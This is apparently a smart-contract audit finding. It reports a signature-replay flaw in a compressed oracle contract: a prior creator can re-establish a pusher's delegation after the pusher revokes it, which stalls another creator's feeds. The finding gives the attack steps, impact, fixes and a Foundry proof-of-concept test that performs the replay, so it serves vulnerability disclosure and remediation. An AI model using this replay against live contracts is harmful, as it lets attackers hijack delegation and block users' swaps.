### Title
`revokePusher()` is ineffective during the consent deadline window — creator can silently re-establish delegation after pusher revokes, causing stale feeds and broken pool swaps - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`revokePusher()` only clears `namespaceRemapping[msg.sender]` but does not invalidate the pusher's previously signed EIP-191 consent. Because `allowPushers` has no nonce and no used-signature tracking, a creator who holds a valid (not-yet-expired) consent signature can immediately replay it to re-establish delegation after the pusher revoked. The pusher's subsequent pushes are silently redirected to the old creator's namespace, starving the intended new creator's feeds of updates and causing every pool swap that reads those feeds to revert with `FeedStalled`.

---

### Finding Description

`allowPushers` verifies a pusher's EIP-191 consent over the tuple `(chainid, address(this), deadline, pusher, msg.sender)`: [1](#0-0) 

There is no nonce, no used-signature bitmap, and no check that the pusher is currently unbound. The only liveness guard is `_ensureDeadline(deadline)`, which only requires the deadline to be in the future.

`revokePusher()` clears the mapping but does nothing to the consent signature: [2](#0-1) 

The code comment on `allowPushers` explicitly acknowledges the risk:

> *"the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [3](#0-2) 

The deadline is presented as the mitigation, but it only prevents replay **after** the deadline expires. During the entire deadline window the creator can replay the original consent at will, making `revokePusher()` a no-op.

**Attack sequence:**

1. Pusher P signs consent for creator A with `deadline = now + 1 day`.
2. Creator A calls `allowPushers` → `namespaceRemapping[P] = A`.
3. P calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. P signs a new consent for creator B and B calls `allowPushers` → `namespaceRemapping[P] = B`.
5. Creator A immediately replays the original (still-valid) signature → `namespaceRemapping[P] = A`.
6. P's pushes now land in A's namespace; B's feeds receive no updates.

The `fallback` push path resolves the namespace at call time: [4](#0-3) 

So every push P makes while believing they are serving B silently writes into A's namespace instead.

---

### Impact Explanation

B's feeds accumulate no new observations. `getOracleData` returns the last stale timestamp. Every price provider that reads B's feeds calls `_isStale`: [5](#0-4) 

`refTime == 0` (never-pushed) or an age exceeding `MAX_REF_STALENESS` both return `true`, causing `_readLeg` to return `ok = false`: [6](#0-5) 

`getBidAndAskPrice` then reverts with `FeedStalled`: [7](#0-6) 

Every swap on any pool whose `IPriceProvider` reads from B's feeds is permanently blocked for as long as creator A keeps replaying the consent — matching the **"Broken core pool functionality causing unusable swap/liquidity flows"** impact gate.

Additionally, if P has changed the semantic meaning of the slot words they push (e.g., now encoding a different asset pair for B), those semantically wrong prices land in A's namespace and are consumed by A's pool as if they were valid quotes — a **bad-price execution** impact.

---

### Likelihood Explanation

- Creator A is a previously authorized, non-privileged participant (not a factory owner or oracle admin).
- The only precondition is that A retained the original consent bytes and the deadline has not yet expired — both trivially satisfied in any normal operating window (deadlines are typically set days in the future).
- The pusher has no on-chain way to detect that their revocation was overridden; they continue pushing believing they serve B.
- No special transaction ordering or MEV is required; A can replay in any block before the deadline.

Likelihood: **Medium** (requires adversarial creator, but the mechanism is fully permissionless and requires no privileged access).

---

### Recommendation

Track consumed consent signatures to prevent replay. The simplest fix is a `mapping(bytes32 => bool) private _usedConsents` keyed on the full consent hash, set to `true` on first use in `allowPushers` and checked before writing `namespaceRemapping`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedConsents[hash], ConsentAlreadyUsed());
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedConsents[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, add a per-pusher revocation nonce that is included in the signed message and incremented by `revokePusher()`, so any previously signed consent is automatically invalidated on revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract RevokePusherReplayPoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY  = 0xBEEF;
    uint256 constant CREATOR_A_KEY = 0xAAAA;

    address pusher;
    address creatorA;
    address creatorB;

    function setUp() public {
        oracle   = new CompressedOracleV1(address(this), 0);
        pusher   = vm.addr(PUSHER_KEY);
        creatorA = vm.addr(CREATOR_A_KEY);
        creatorB = address(0xB0B);
        vm.warp(1_700_000_000);
    }

    function testRevokePusherIsIneffectiveDuringDeadlineWindow() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator A.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creatorA))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator A establishes delegation.
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA);

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoke cleared");

        // 4. Pusher re-delegates to creator B (new consent, new deadline).
        uint256 deadline2 = block.timestamp + 1 days;
        bytes32 digest2 = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline2, pusher, creatorB))
        );
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(PUSHER_KEY, digest2);
        sigs[0] = abi.encodePacked(r2, s2, v2);
        vm.prank(creatorB);
        oracle.allowPushers(deadline2, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorB);

        // 5. Creator A replays the ORIGINAL signature — re-establishes delegation silently.
        sigs[0] = sig; // original sig, deadline still in the future
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);

        // Pusher is now back under creator A's control despite having revoked.
        assertEq(oracle.namespaceRemapping(pusher), creatorA,
            "VULN: revokePusher is ineffective; creator A hijacked delegation back");

        // 6. Pusher's pushes now land in A's namespace, not B's.
        //    B's feeds receive no updates → stale → FeedStalled on every pool swap.
    }
}
```
